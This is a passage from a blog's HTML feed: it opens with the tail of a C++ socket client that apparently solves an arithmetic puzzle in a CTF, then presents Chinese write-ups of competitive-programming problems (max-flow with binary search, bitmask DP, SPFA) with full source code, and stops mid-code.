class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; in;</span><br><span class="line"><span class="type">int</span> fl = in.<span class="built_in">size</span>(); <span class="keyword">while</span> (in[fl] != <span class="string">&#x27;:&#x27;</span>)fl--;</span><br><span class="line">in = in.<span class="built_in">substr</span>(fl, in.<span class="built_in">size</span>() - fl);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> arr[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">sscanf</span>(in.<span class="built_in">c_str</span>(), <span class="string">&quot;:%d, %d, %d, %d&quot;</span>, &amp;arr[<span class="number">0</span>], &amp;arr[<span class="number">1</span>], &amp;arr[<span class="number">2</span>], &amp;arr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">prev_permutation</span>(arr, arr + <span class="number">4</span>));</span><br><span class="line"><span class="built_in">next_permutation</span>(arr, arr + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">next_permutation</span>(arr, arr + <span class="number">4</span>)) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j&lt;<span class="number">4</span>; j++)</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">string exp = <span class="built_in">to_string</span>(arr[<span class="number">0</span>]) + <span class="built_in">to_symbol</span>(i) +</span><br><span class="line"><span class="built_in">to_string</span>(arr[<span class="number">1</span>]) + <span class="built_in">to_symbol</span>(j) +</span><br><span class="line"><span class="built_in">to_string</span>(arr[<span class="number">2</span>]) + <span class="built_in">to_symbol</span>(k) +</span><br><span class="line"><span class="built_in">to_string</span>(arr[<span class="number">3</span>]);</span><br><span class="line"><span class="comment">//cout &lt;&lt; exp;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">cal</span>(exp) == <span class="number">9</span>) &#123;</span><br><span class="line"><span class="built_in">put</span>(exp);</span><br><span class="line"><span class="keyword">goto</span> end;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">end:;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">closesocket</span>(server);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;既然web组的人多。。那先写web？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;WEB&quot;&gt;WEB&lt;/h2&gt;
&lt;h4 id=&quot;Where-is-the-Flag&quot;&gt;Where is the Flag?&lt;/h4&gt;
&lt;p&gt;看源代码，flag在注</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.frankli.site/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>旧的几篇题解</title>
    <link href="https://blog.frankli.site/2018/08/01/Misc/%E6%97%A7%E7%9A%84%E5%87%A0%E7%AF%87%E9%A2%98%E8%A7%A3/"/>
    <id>https://blog.frankli.site/2018/08/01/Misc/%E6%97%A7%E7%9A%84%E5%87%A0%E7%AF%87%E9%A2%98%E8%A7%A3/</id>
    <published>2018-07-31T16:00:00.000Z</published>
    <updated>2021-04-11T21:40:01.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一些高中时候的奇怪题解</p></blockquote><h2 id="Freda的城堡">Freda的城堡</h2><blockquote><p>来源: codevs 2490/bzoj3035/gxyz.openjudge.cn11867</p></blockquote><h3 id="思路">思路</h3><p>将每个入侵者与每个防御塔分别抽象成两个点集{invaders},{defences}<br>将每个防御塔每次射击与其能够达到的入侵者连边，这样我们就得到了一幅二分图</p><ul><li>”每次射击”：</li></ul><p>拿一个防御塔来说，它每t时会发射一次，总共有T时，那么它可以发射floor(T/t)次，也就是说它可以消灭这么多次个敌人。将每次发射抽象为一个点，连边，如:若有N个防御塔，第i个防御塔第n次发射抽象出的点为(i*n+N)。</p><p>问题转化为：<br>第$i$次发射记为$d_i$，第$i$个入侵者记为$t_i$，找到集合大小$|{d}|$的最小值。此时${d}$与${t}$最接近二分图的完美匹配</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INF 0x7fff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE 1000000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> launchers, invaders;</span><br><span class="line"><span class="type">double</span> launchT, cooldownT;</span><br><span class="line"><span class="type">double</span> Distance[<span class="number">300</span>][<span class="number">300</span>];</span><br><span class="line"><span class="type">int</span> head[SIZE], Next[SIZE], tot = <span class="number">1</span>, Start, End;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> dest, Time;</span><br><span class="line">&#125; graph_list[SIZE];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">push_front</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to, <span class="type">int</span> weight)</span> </span>&#123;</span><br><span class="line">    graph_list[++tot].dest = to;</span><br><span class="line">    graph_list[tot].Time = weight;</span><br><span class="line">    Next[tot] = head[from];</span><br><span class="line">    head[from] = tot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">connect</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to, <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">push_front</span>(from, to, d);</span><br><span class="line">    <span class="built_in">push_front</span>(to, from, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">queue&lt;<span class="type">int</span>&gt; bfsCore;</span><br><span class="line"><span class="type">int</span> depth[SIZE];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bfs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(depth, <span class="number">0</span>, <span class="built_in">sizeof</span>(depth));</span><br><span class="line">    <span class="keyword">while</span> (bfsCore.<span class="built_in">size</span>())</span><br><span class="line">        bfsCore.<span class="built_in">pop</span>();</span><br><span class="line">    depth[Start] = <span class="number">1</span>;</span><br><span class="line">    bfsCore.<span class="built_in">push</span>(Start);</span><br><span class="line">    <span class="keyword">while</span> (bfsCore.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> current = bfsCore.<span class="built_in">front</span>();</span><br><span class="line">        bfsCore.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = head[current]; i; i = Next[i]) &#123;</span><br><span class="line">            <span class="type">int</span> dest = graph_list[i].dest;</span><br><span class="line">            <span class="keyword">if</span> (!depth[dest] &amp;&amp; graph_list[i].Time)</span><br><span class="line">                depth[dest] = depth[current] + <span class="number">1</span>,</span><br><span class="line">                bfsCore.<span class="built_in">push</span>(dest);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (depth[End])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> current, <span class="type">int</span> CurrentTime)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current == End || CurrentTime == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> CurrentTime;</span><br><span class="line">    <span class="type">int</span> remaining = CurrentTime;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = head[current]; i; i = Next[i]) &#123;</span><br><span class="line">        <span class="type">int</span> v = graph_list[i].dest;</span><br><span class="line">        <span class="keyword">if</span> (depth[v] == depth[current] + <span class="number">1</span> &amp;&amp; graph_list[i].Time) &#123;</span><br><span class="line">            <span class="type">int</span> timeRemaining = <span class="built_in">dfs</span>(v, <span class="built_in">min</span>(remaining, graph_list[i].Time));</span><br><span class="line">            <span class="keyword">if</span> (timeRemaining &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                remaining -= timeRemaining;</span><br><span class="line">                graph_list[i].Time -= timeRemaining;</span><br><span class="line">                graph_list[i ^ <span class="number">1</span>].Time += timeRemaining;</span><br><span class="line">                <span class="keyword">if</span> (!remaining)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                depth[v] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (CurrentTime - remaining == <span class="number">0</span>)</span><br><span class="line">        depth[current] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> CurrentTime - remaining;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Can_kill</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">bfs</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> tmp = <span class="built_in">dfs</span>(Start, INF);</span><br><span class="line">        <span class="keyword">if</span> (tmp == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ans += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">able_to_success</span><span class="params">(<span class="type">double</span> givenTime)</span> </span>&#123;</span><br><span class="line">    tot = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(head, <span class="number">0</span>, <span class="built_in">sizeof</span>(head));</span><br><span class="line">    <span class="built_in">memset</span>(Next, <span class="number">0</span>, <span class="keyword">sizeof</span> Next);</span><br><span class="line">    <span class="type">int</span> d = (givenTime - launchT) / (launchT + cooldownT) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= launchers; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; d; j++) &#123;</span><br><span class="line">            <span class="type">double</span> now = launchT + j * (launchT + cooldownT);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= invaders; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (now + Distance[i][k] &lt;= givenTime)</span><br><span class="line">                    <span class="built_in">connect</span>(i + j * launchers, d * launchers + k, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Start = <span class="number">0</span>;</span><br><span class="line">    End = d * launchers + invaders + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= d * launchers; i++)</span><br><span class="line">        <span class="built_in">connect</span>(Start, i, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = d * launchers + <span class="number">1</span>; i &lt;= d * launchers + invaders; i++)</span><br><span class="line">        <span class="built_in">connect</span>(i, End, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Can_kill</span>() == invaders;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">MinTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> l = launchT, r = INF;</span><br><span class="line">    <span class="type">int</span> maxStep = <span class="number">50</span>; <span class="comment">//20+20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (l - r != <span class="number">0</span> &amp;&amp; maxStep--) &#123;</span><br><span class="line">        <span class="type">double</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">able_to_success</span>(mid))</span><br><span class="line">            r = mid;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            l = mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x[SIZE], y[SIZE];</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">dis</span><span class="params">(<span class="type">int</span> x1, <span class="type">int</span> y1, <span class="type">int</span> x2, <span class="type">int</span> y2)</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> a = x1 - x2, b = y1 - y2;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(a * a + b * b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> v;</span><br><span class="line">    cin &gt;&gt; launchers &gt;&gt; invaders &gt;&gt; launchT &gt;&gt; cooldownT &gt;&gt; v;</span><br><span class="line">    launchT /= <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= invaders; i++)</span><br><span class="line">        cin &gt;&gt; x[i] &gt;&gt; y[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= launchers; i++) &#123;</span><br><span class="line">        <span class="type">int</span> destX, destY;</span><br><span class="line">        cin &gt;&gt; destX &gt;&gt; destY;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= invaders; j++)</span><br><span class="line">            Distance[i][j] = <span class="built_in">dis</span>(x[j], y[j], destX, destY) / v;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; fixed &lt;&lt; <span class="built_in">setprecision</span>(<span class="number">6</span>) &lt;&lt; <span class="built_in">MinTime</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="互不侵犯">互不侵犯</h2><blockquote><p>来源: SCOI2005/luoguP1896</p></blockquote><p>压位dp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> mem[<span class="number">5000</span>][<span class="number">15</span>][<span class="number">105</span>];</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> status;</span><br><span class="line"><span class="type">int</span> n, max_status, step_limit;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">count</span><span class="params">(status &amp;a)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        ans += ((a &gt;&gt; i) &amp; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(status last, <span class="type">int</span> remain, <span class="type">int</span> step = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (remain &lt; <span class="number">0</span> || remain &gt; ((n &gt;&gt; <span class="number">1</span>) + (n % <span class="number">2</span>)) * (((n - step + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>) + ((n - step + <span class="number">1</span>) % <span class="number">2</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (step &gt; n)</span><br><span class="line">        <span class="keyword">return</span> !remain;</span><br><span class="line">    <span class="keyword">if</span> (mem[last][step][remain])</span><br><span class="line">        <span class="keyword">return</span> mem[last][step][remain];</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (status now = <span class="number">0</span>; now &lt;= max_status; now++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((now &amp; (now &lt;&lt; <span class="number">1</span>)) || (now &amp; last) || (now &amp; (last &lt;&lt; <span class="number">1</span>)) || (now &amp; (last &gt;&gt; <span class="number">1</span>)))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        ans += <span class="built_in">dfs</span>(now, remain - <span class="built_in">count</span>(now), step + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mem[last][step][remain] = ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; step_limit;</span><br><span class="line">    max_status = ~-(<span class="number">1</span> &lt;&lt; n);</span><br><span class="line">    cout &lt;&lt; <span class="built_in">dfs</span>(<span class="number">0ll</span>, step_limit);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="华容道">华容道</h2><blockquote><p>来源: luoguP1979/NOIP2013</p></blockquote><p>首先我们可以通过人生经验得知这是一道图论题，但是我们发现需要抽象点。<br>我们发现棋面每一步移动都可以导向另一个棋面，于是我们可以把每一步移动当作一个点。<br>对于每一个点，有四个移动方式（上下左右）（↑↑↓↓←→←→ABAB）将每个移动编号，跑SPFA</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE 31</span></span><br><span class="line"><span class="type">bool</span> map[SIZE][SIZE];</span><br><span class="line"><span class="type">int</span> SizeX, SizeY;</span><br><span class="line"><span class="type">int</span> EmptyX, EmptyY;</span><br><span class="line"><span class="type">int</span> StartX, StartY;</span><br><span class="line"><span class="type">int</span> TargX, TargY;</span><br><span class="line"><span class="type">int</span> gamePlays;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> MAXNODE = <span class="number">10000</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">        <span class="type">int</span> dest, weight;</span><br><span class="line">        <span class="built_in">Edge</span>(<span class="type">int</span> d, <span class="type">int</span> w) :</span><br><span class="line">            <span class="built_in">dest</span>(d), <span class="built_in">weight</span>(w) &#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    list&lt;Edge&gt;map[MAXNODE];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SPFA</span> :<span class="keyword">private</span> Graph &#123;</span><br><span class="line">    <span class="type">int</span> dis[MAXNODE];</span><br><span class="line">    <span class="type">bool</span> visited[MAXNODE];</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt;joblist;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">memset</span>(dis, <span class="number">1</span>, <span class="keyword">sizeof</span> dis);</span><br><span class="line">        <span class="built_in">memset</span>(visited, <span class="number">0</span>, <span class="keyword">sizeof</span> visited);</span><br><span class="line">        <span class="keyword">while</span> (!joblist.<span class="built_in">empty</span>())joblist.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">work</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!joblist.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> current = joblist.<span class="built_in">front</span>();</span><br><span class="line">            joblist.<span class="built_in">pop</span>();</span><br><span class="line">            visited[current] = <span class="number">0</span>;</span><br><span class="line">            list&lt;Edge&gt;::iterator i = map[current].<span class="built_in">begin</span>();</span><br><span class="line">            <span class="keyword">for</span> (; i != map[current].<span class="built_in">end</span>(); i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dis[i-&gt;dest] &gt; dis[current] + i-&gt;weight) &#123;</span><br><span class="line">                    dis[i-&gt;dest] = dis[current] + i-&gt;weight;</span><br><span class="line">                    <span class="keyword">if</span> (!visited[i-&gt;dest]) &#123;</span><br><span class="line">                        joblist.<span class="built_in">push</span>(i-&gt;dest);</span><br><span class="line">                        visited[i-&gt;dest] = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">connect</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">        map[a].<span class="built_in">push_front</span>(<span class="built_in">Edge</span>(b, w));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title 